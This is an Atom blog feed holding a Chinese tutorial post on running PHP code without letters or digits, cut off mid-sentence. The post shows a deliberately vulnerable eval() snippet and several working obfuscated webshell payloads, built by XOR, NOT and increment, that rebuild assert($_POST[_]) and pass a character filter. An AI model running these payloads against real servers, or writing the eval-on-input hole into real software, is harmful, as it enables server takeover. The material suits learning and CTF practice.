<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Welcome to Arsene.Tang &#39;s Blog</title>
  
  <subtitle>一个喜欢web安全但菜的离谱的萌新</subtitle>
  <link href="https://arsenetang.github.io/atom.xml" rel="self"/>
  
  <link href="https://arsenetang.github.io/"/>
  <updated>2021-07-28T14:23:29.474Z</updated>
  <id>https://arsenetang.github.io/</id>
  
  <author>
    <name>Arsene.Tang</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>RCE篇之无数字字母rce</title>
    <link href="https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/"/>
    <id>https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/</id>
    <published>2021-07-28T11:00:25.384Z</published>
    <updated>2021-07-28T14:23:29.474Z</updated>
    
    <content type="html"><![CDATA[<h1 id="无数字字母rce"><a href="#无数字字母rce" class="headerlink" title="无数字字母rce"></a>无数字字母rce</h1><p>无数字字母rce，这是一个老生常谈的问题了，就是不利用数字和字母构造出<code>webshell</code>，从而能够执行我们的命令，之前一直没有系统总结过，今天来好好总结总结，这里主要是总结异或和取反两种方法，这两种方法是目前来看最实用的两种方法，还有一种自增的方法稍微介绍一下就好</p><span id="more"></span><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里的思路就是利用各种非数字字母的字符，经过各种变换（异或、取反、自增），构造出单个的字母字符，然后把单个字符拼接成一个函数名，比如说<code>assert</code>，然后就可以动态执行了。所以说这里的核心就是要将非字母的字符变换成字母字符。</p><h2 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或 ^"></a>1.异或 ^</h2><p>这里的异或，指的是php按位异或，在php中，两个字符进行异或操作后，得到的依然是<strong>一个字符</strong>，所以说当我们想得到<code>a-z</code>中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成<code>ascii码</code>值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是<strong>相同为零，不同为一</strong>，<code>ascii码</code>表参考如下：</p><p><img src="https://i.loli.net/2021/07/27/vmfHFZrN9GLSC8j.png" alt="image.png"></p><p>那假如说我们想要构造出小写字母<code>a</code>，按照上表，<code>a</code>的二进制为<code>01100001</code>，那我们就可以选择两个非字母数字的字符进行异或，这里有很多种选法，我选择的是<code>@</code>和<code>!</code>这两个，成功异或出了字母<code>a</code>：</p><p><img src="https://i.loli.net/2021/07/27/9LjN3A1XWbI5gyQ.png" alt="image.png"></p><p>然后我们就可以按照这个方法进行拼接了，我们的目标字符串是<code>assert($_POST[_])</code>，其实很简单，我们需要拼接的字母只有九个而已，拼接结果如下，因为很多都是不可见的字符，所以说我就先url编码了一下（url编码就是它的16进制编码前面加个<code>%</code>哈）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; e:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span> ; r:<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span> ; t:<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span></span><br><span class="line">P:<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; O:<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span> ; S:<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span> ; T:<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span></span><br><span class="line">拼接起来：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);  <span class="comment">// $_=assert</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);  <span class="comment">// $__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>; <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);<span class="comment">//assert($_POST[_]);</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>).(<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span>).(<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span>).(<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0F&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;%5D&#x27;</span>).(<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure><p>以上是我自己构造的，经检验没有问题，构造结果可能会有很多种，但方法都是一样的，这样就可以成功进行rce了，</p><p><img src="https://i.loli.net/2021/07/27/vSh3eydGNwBzgkZ.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/07/27/kypjYmDBNxHvRET.png" alt="image.png"></p><h2 id="2-取反"><a href="#2-取反" class="headerlink" title="2.取反 ~"></a>2.取反 ~</h2><p>取反也是php中的一种运算符，关于取反的具体规则可以参考这篇文章：<a href="https://blog.csdn.net/WilliamsWayne/article/details/78259501">https://blog.csdn.net/WilliamsWayne/article/details/78259501</a>，写得挺详细的，取反的好处就是，它每一个字符取反之后都会变成另一个字符，不像异或需要两个字符才能构造出一个字符。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>首先，我们想要构造的依然是<code>assert($_POST[_])</code>这条语句，和上面一样，我们先用<code>php</code>的取反符号<code>~</code>将字符串<code>assert</code>和<code>_POST</code>取反，这里需要注意的是，由于它取反之后会有大量不可显字符，所以我们同样需要将其url编码，然后当我们要用的时候，再利用取反符号把它们取回来即可，具体请见下图：</p><p><img src="https://i.loli.net/2021/07/28/AYS9t7P1phwTdaK.png" alt="image.png"></p><p>可以看到，<code>assert</code>的取反结果是<code>%9E%8C%8C%9A%8D%8B</code>，<code>_POST</code>的取反结果是<code>%A0%AF%B0%AC%AB</code>，那我们就开始构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=~(%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B);    <span class="comment">//这里利用取反符号把它取回来，$_=assert</span></span><br><span class="line"><span class="variable">$__</span>=~(%A0%AF%B0%AC%AB);      <span class="comment">//$__=_POST</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;                   <span class="comment">//$___=$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);                 <span class="comment">//assert($_POST[_]);</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=~(%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B);<span class="variable">$__</span>=~(%A0%AF%B0%AC%AB);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/28/4NFVPvmRjJueMqs.png" alt="image.png"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>方法二是我看p神博客才了解到的方法，就是说利用的是UTF-8编码的某个汉字，并将其中某个字符取出来，然后再进行一次取反操作，就能得到一个我们想要的字符，这里的原理我确实是不知道，因为这里好像是涉及到计组知识而我现在还没学，害，现在就只有先学会怎么用，原理后面再补了</p><p><img src="https://i.loli.net/2021/07/28/6lw7a4knZY3B9SH.png" alt="image.png"></p><p>这里之所以会输出两个相同的<code>r</code>，就是因为里面<code>$_&#123;1&#125;</code>就是<code>\x8d</code>，然后这里对<code>\x86</code>进行取反就能得到<code>r</code>，原理不详</p><p>总之我们需要知道的是，对于一个汉字进行<code>~($x&#123;0&#125;)</code>或<code>~($x&#123;1&#125;)</code>或<code>~($x&#123;2&#125;)</code>的操作，可以得到某个<code>ascii码</code>的字符值，我们就可以利用这一点构造出<code>webshell</code></p><p>这里由于不知道原理，我就不自己构造了，直接拿出网上大神的exp:<a href="https://xz.aliyun.com/t/8107">https://xz.aliyun.com/t/8107</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>++;                <span class="comment">//得到1，此时$_=1</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到a，此时$___=&quot;a&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到s，此时$___=&quot;as&quot;</span></span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//此时$___=&quot;ass&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到e，此时$___=&quot;asse&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到r，此时$___=&quot;asser&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;</span><br><span class="line"><span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到t，此时$___=&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;          <span class="comment">//$____=&#x27;_&#x27;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到P，此时$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到O，此时$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到S，此时$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;</span><br><span class="line"><span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);   <span class="comment">//得到T，此时$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span> = <span class="variable">$$____</span>;           <span class="comment">//$_ = $_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);           <span class="comment">//assert($_POST[_])</span></span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$__</span> = <span class="string">&quot;极&quot;</span>;<span class="variable">$___</span> = ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;区&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;皮&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;十&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;勺&quot;</span>;<span class="variable">$___</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$____</span> = <span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span> = <span class="string">&quot;寸&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;小&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;欠&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$__</span> = <span class="string">&quot;立&quot;</span>;<span class="variable">$____</span> .= ~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$_</span> = <span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br></pre></td></tr></table></figure><p>由于不可见字符的原因，我们还是要进行url编码之后才能正常使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24_%2B%2B%3B%24__%20%3D%20%22%E6%9E%81%22%3B%24___%20%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8C%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%9A%AE%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8D%81%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%8B%BA%22%3B%24___%20.%3D%20~(%24__%7B%24_%7D)%3B%24____%20%3D%20&#x27;_&#x27;%3B%24__%20%3D%20%22%E5%AF%B8%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E5%B0%8F%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E6%AC%A0%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24__%20%3D%20%22%E7%AB%8B%22%3B%24____%20.%3D%20~(%24__%7B%24_%7D)%3B%24_%20%3D%20%24%24____%3B%24___(%24_%5B_%5D)%3B</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/28/yormF8QcDX6BJMC.png" alt="image.png"></p><h2 id="3-自增"><a href="#3-自增" class="headerlink" title="3.自增 ++"></a>3.自增 ++</h2><p>我们先看看php语言自增、自减的规则：<a href="https://www.php.net/manual/zh/language.operators.increment.php">https://www.php.net/manual/zh/language.operators.increment.php</a></p><p>在处理字符变量的算数运算时，<code>PHP</code>沿袭了<code>Perl</code>的习惯，而不是C语言的。在C语言中，它递增的是<code>ASCII值,a = &#39;Z&#39;; a++;</code> 将把 <code>a</code> 变成 <code>&#39;[&#39;</code>（<code>&#39;Z&#39;</code> 的 ASCII 值是 90，<code>&#39;[&#39;</code> 的 ASCII 值是 91），而在Perl中， <code>$a = &#39;Z&#39;; $a++;</code> 将把 <code>$a</code> 变成<code>&#39;AA&#39;</code>。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增或递减其他字符变量则无效，原字符串没有变化。</p><p>也就是说，只要我们获得了小写字母<code>a</code>，就可以通过自增获得所有小写字母，当我们获得大写字母<code>A</code>，就可以获得所有大写字母了</p><p>正好，数组(Array)中就正好有大写字母<code>A</code>和小写字母<code>a</code>，而在PHP中，如果强制连接数组和字符串的话，数组就会被强制转换成字符串，它的值就为<code>Array</code>，那取它的第一个子母，就拿到<code>A</code>了，那有了<code>a</code>和<code>A</code>，相当于我们就可以拿到<code>a-z</code>和<code>A-Z</code>中的所有字母了</p><p><img src="https://i.loli.net/2021/07/28/4HgcwPoizFrmWxn.png" alt="image.png"></p><p>这里我就直接给出p神的构造结果了，构造出来很长，而且我感觉也不是特别实用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>放到一排再url编码之后是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B&#x27;!&#x27;%3D%3D&#x27;%40&#x27;%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D&#x27;_&#xspan><br></pre></td></tr></table></figure><p>说实话真的太长了，要是稍微有个长度限制就用不了，所以说这种方法只做了解即可</p><h2 id="php5和php7的区别"><a href="#php5和php7的区别" class="headerlink" title="php5和php7的区别"></a>php5和php7的区别</h2><p>在研究无数字字母rce的过程中，一个很重要的函数就是<code>assert</code>，但在php5的版本和php7的版本中，它是有一些区别的，我们上面的测试都是基于php5进行的，在php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码，在php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，但是在php7中，我们可以使用($a)()这种方法来执行命令，那相当于我们对phpinfo取反后就可以直接执行了，也可以选择file_put_contents()来写入shell，在php5中这样是不行的：</p><p><img src="https://i.loli.net/2021/07/28/Qg5qLsabUhoZMj2.png" 